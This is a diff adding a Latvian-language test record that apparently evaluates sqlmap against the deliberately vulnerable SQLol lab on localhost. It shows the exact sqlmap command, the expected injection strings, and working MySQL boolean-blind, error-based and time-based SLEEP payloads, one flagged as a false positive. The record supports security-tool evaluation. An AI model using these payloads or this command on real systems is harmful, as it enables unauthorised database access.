@@ -1,0 +1,35 @@
+=================================================================================
+1. Īpašība: tabulas ieraksti netiek izprinteti ieks .html, bet tiek raditas kludas
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: -
+3.2. error-based: ?inject_string=test'
+3.3. time-based: ?inject_string=test' or sleep(1)%23
+3.4. union: -
+4. Reālais rezultāts: redzams zemāk (neatklāts false positive)
+5. Vidējais risinājuma ilgums: 16572795 ns
+6. Palaistā komanda
+sqlmap -u "http://localhost/MCIR/sqlol/select.php?sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=none&error_level=verbose&inject_string=test&location=where_string&submit=Inject%21" -p inject_string --risk=3 --level=5
+
+7. Jautājumi, kurus uzdeva SQLMap:
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
+7.3. GET parameters 'inject_string' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 719 HTTP(s) requests:
+---
+Parameter: inject_string (GET)
+    Type: boolean-based blind (FALSE POSITIVE)
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=none&error_level=verbose&inject_string=test' AND 4358=(SELECT (CASE WHEN (4358=4358) THEN 4358 ELSE (SELECT 6523 UNION SELECT 8618) END))-- -&location=where_string&submit=Inject!
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=none&error_level=verbose&inject_string=test' AND GTID_SUBSET(CONCAT(0x71707a6a71,(SELECT (ELT(1205=1205,1))),0x71786a7871),1205)-- IbqE&location=where_string&submit=Inject!
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sanitization_level=none&sanitization_type=keyword&sanitization_params=&query_results=none&error_level=verbose&inject_string=test' AND (SELECT 6897 FROM (SELECT(SLEEP(5)))Ayei)-- KNsk&location=where_string&submit=Inject!
+---
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
